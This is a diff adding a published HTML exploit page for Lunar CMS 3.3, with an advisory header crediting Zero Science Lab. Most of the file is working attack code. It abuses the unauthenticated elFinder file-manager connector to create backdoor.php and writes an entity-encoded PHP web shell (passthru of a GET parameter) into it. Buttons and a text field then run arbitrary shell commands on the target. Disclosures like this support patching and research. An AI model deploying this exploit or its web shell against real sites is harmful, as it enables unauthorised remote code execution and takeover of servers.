@@ -1,0 +1,129 @@
+
+<!--
+
+
+Lunar CMS 3.3 Unauthenticated Remote Command Execution Exploit
+
+
+Vendor: Lunar CMS
+Product web page: http://www.lunarcms.com
+Affected version: 3.3
+
+Summary: Lunar CMS is a freely distributable open source content
+management system written for use on servers running the ever so
+popular PHP5 & MySQL.
+
+Desc: Lunar CMS suffers from an unauthenticated arbitrary command
+execution vulnerability. The issue is caused due to the improper
+verification of elfinder's upload/create/rename function in the file
+manager. This can be exploited to execute arbitrary PHP code by creating
+or uploading a malicious PHP script file that will be stored in '/files'
+directory.
+
+Tested on: Apache/2.4.7 (Win32)
+           PHP/5.5.6
+           MySQL 5.6.14
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2014-5189
+Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2014-5189.php
+
+Vendor fix: http://lunarcms.com/Get.html
+
+
+11.06.2014
+
+-->
+
+
+<html>
+<title>Lunar CMS 3.3 Unauthenticated Remote Command Execution Exploit</title>
+<link rel="Shortcut Icon" href="http://zeroscience.mk/favicon.ico" type="image/x-icon">
+<body bgcolor="#1C1C1C"><br />
+<img style="margin-left:10" src="http://zeroscience.mk/images/zsl-logo1.png" hight="20%" width="20%">
+
+<script type="text/javascript">
+
+var disclaimer = "This  document and all the information it contains are provided \"as is\",\n" +
+                 "for educational purposes only, without warranty of any kind, whether\n" +
+                 "express or implied.\n\n" +
+
+                 "The  author reserves the right not to be responsible for the topicality,\n" +
+                 "correctness, completeness or quality of the information provided in\n" +
+                 "this document. Liability claims regarding damage caused by the use of\n" +
+                 "any information provided, including any kind of information which is\n" +
+                 "incomplete or incorrect, will therefore be rejected.";
+
+var answ = confirm(disclaimer);
+
+if (answ == true){}else{window.location.href = "http://www.lunarcms.com";}
+
+function visi(id) {
+  var x = document.getElementById(id);
+  if(x.style.display == 'block')
+    x.style.display = 'none';
+  else
+    x.style.display = 'block';
+}
+
+function create_file(){
+  window.open("http://localhost/lc/admin/includes/elfinder/php/connector.php?cmd=mkfile&name=backdoor.php&target=l1_XA","ZSL_iframe");
+}
+
+function exec(){
+  var command = document.getElementById("exec");
+  var url = "http://localhost/lc/files/backdoor.php?cmd=";
+  var cmdexec = command.value;
+  window.open(url+cmdexec,"ZSL_iframe");
+}
+
+function put(){document.forms["put"].submit();}
+
+</script>
+
+<center><h2 style="position:absolute;left:425;top:32;background-color:#BAB8B9;width:150">
+Response:</h2></center>
+
+<iframe src="http://localhost/lc/admin" width="900" height="400"
+name="ZSL_iframe" align="top" frameborder="0" style="position:absolute;left:425;
+top:80;background-color:#cecece;"></iframe>
+
+<form action="http://localhost/lc/admin/includes/elfinder/php/connector.php" method="POST" id="put" target="ZSL_iframe">
+<input type="hidden" name="cmd" value="put" />
+<input type="hidden" name="target" value="l1&#95;YmFja2Rvb3IucGhw" />
+<input type="hidden" name="content" value="&lt;&#63;php&#32;passthru&#40;&#36;&#95;GET&#91;&apos;cmd&apos;&#93;&#41;&#59;&#32;&#63;&gt;" />
+</form>
+
+<p style="color:white;width:235;text-align:left;padding-top:10;padding-bottom:5;margin-left:10;padding-left:10;border-style:hidden hidden dotted dotted;border-color:yellow">
+Remote Code Execution
+</p>
+
+<input type="button"
+style="color:white;background-color:#2C3C8C;cursor:pointer;border-style:groove;border-color:black;display:block;
+width:250;text-align:left;padding-top:10;padding-bottom:10;margin-left:10" id="crfile"
+value="1. Create filename (backdoor.php)" onClick=visi("poot");create_file();visi("crfile"); />
+<br /><br />
+
+<input type="button"
+style="color:white;background-color:#3D8861;cursor:pointer;border-style:groove;border-color:black;display:none;
+width:250;text-align:left;padding-top:10;padding-bottom:10;margin-left:10" id="poot"
+value="2. Write payload" onClick=visi("exec");put();visi("poot");visi("execbtn"); />
+<br /><br />
+
+<form action="javascript:exec()">
+<input type="text"
+style="color:black;background-color:white;border-style:groove;border-color:black;display:none;
+width:250;text-align:left;padding-top:5;padding-bottom:5;margin-left:10" id="exec"
+placeholder="Enter a command">
+</form>
+
+<input type="button"
+style="color:white;background-color:#c05c5c;cursor:pointer;border-style:groove;border-color:black;display:none;
+width:150;text-align:left;padding-top:10;padding-bottom:10;margin-left:10" id="execbtn"
+value="3. Execute" onClick=exec(); />
+
+</body></html>
